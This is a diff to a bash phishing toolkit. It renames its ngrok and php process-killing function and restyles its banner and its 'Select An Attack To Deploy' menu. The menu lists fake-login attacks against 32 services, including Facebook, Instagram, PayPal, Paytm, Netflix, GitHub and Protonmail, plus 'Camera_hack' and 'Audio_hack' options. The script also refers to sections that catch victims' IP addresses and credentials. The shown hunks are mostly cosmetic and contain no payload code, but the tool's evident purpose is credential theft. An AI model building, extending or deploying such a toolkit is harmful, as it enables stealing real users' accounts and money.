@@ -275,7 +275,7 @@ catch_ip() {
 }
 
 # KILL NGROK
-function kill_ngrok() {
+function kill_session() {
         Kill_php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
         kill_ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
         kill -9 ${kill_php} > /dev/null 2>&1
@@ -321,9 +321,10 @@ banner2() {
      
         Author    : ${white}Ashish Singh${green}                 
         Github    : ${white}github.com/Bhaviktutorials${green}   
-        Publisher : ${white}Bhavik OZa${green}                   
+        Publisher : ${white}Bhavik Oza${green}                   
      
-        >> ${white}${final_url}${green} \n\n"
+        >> ${white}${final_url}${green} \n
+\e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${green}\n\n"	
 }
 
 #credentials
@@ -436,20 +437,20 @@ do
       printf "${green}       |${white}    c r e a t e d  b y  a s h i s h ${green}  |\n"
       printf "${green}       ╚──────────────────────────────────────╝\n\n"
 
-     printf "           ${white}>>${green} Select An Attack To Deploy ${white}<<\n\n"
+     printf "           ${green}💻 \e[1;4;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
 ###change banner ---- start here
 banner(){	
-        printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n\n"
-        printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;31m[\e[0m\e[1;92m13\e[0m\e[1;31m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;31m[\e[0m\e[1;92m24\e[0m\e[1;31m] \e[0m\e[1;37;43mSnapchat\e[0m\n\n" 
-        printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;31m[\e[0m\e[1;92m14\e[0m\e[1;31m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;31m[\e[0m\e[1;92m25\e[0m\e[1;31m] \e[0m\e[1;37;40mProtonmail\e[0m\n\n"
-        printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;31m[\e[0m\e[1;92m15\e[0m\e[1;31m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;31m[\e[0m\e[1;92m26\e[0m\e[1;31m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
-        printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;31m[\e[0m\e[1;92m16\e[0m\e[1;31m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;31m[\e[0m\e[1;92m27\e[0m\e[1;31m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
-        printf "\e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;31m[\e[0m\e[1;92m17\e[0m\e[1;31m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;31m[\e[0m\e[1;92m28\e[0m\e[1;31m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
-        printf "\e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;31m[\e[0m\e[1;92m18\e[0m\e[1;31m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;31m[\e[0m\e[1;92m29\e[0m\e[1;31m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
-        printf "\e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;31m[\e[0m\e[1;92m19\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;31m[\e[0m\e[1;92m30\e[0m\e[1;31m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
-        printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;31m[\e[0m\e[1;92m20\e[0m\e[1;31m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;31m[\e[0m\e[1;92m31\e[0m\e[1;31m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
-        printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
-        printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m\n\n" 
+        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m04\e[0m\e[1;92m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;92m[\e[0m\e[1;37m15\e[0m\e[1;92m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;92m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
+        printf "\e[1;92m[\e[0m\e[1;37m05\e[0m\e[1;92m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;92m[\e[0m\e[1;37m16\e[0m\e[1;92m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;92m[\e[0m\e[1;37m27\e[0m\e[1;92m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
+        printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
+        printf "\e[1;92m[\e[0m\e[1;37m07\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;92m[\e[0m\e[1;37m18\e[0m\e[1;92m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;92m[\e[0m\e[1;37m29\e[0m\e[1;92m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m08\e[0m\e[1;92m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;92m[\e[0m\e[1;37m19\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;92m[\e[0m\e[1;37m30\e[0m\e[1;92m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
+        printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
         read -p $'\e[1;34mshark \e[1;97m>>\e[0m ' option
 }
 
@@ -459,7 +460,7 @@ banner(){
 #######
 
         os
-        kill_ngrok
+        kill_session
         banner
 
         if [ $option = 01 ] || [ $option = 1 ];then		
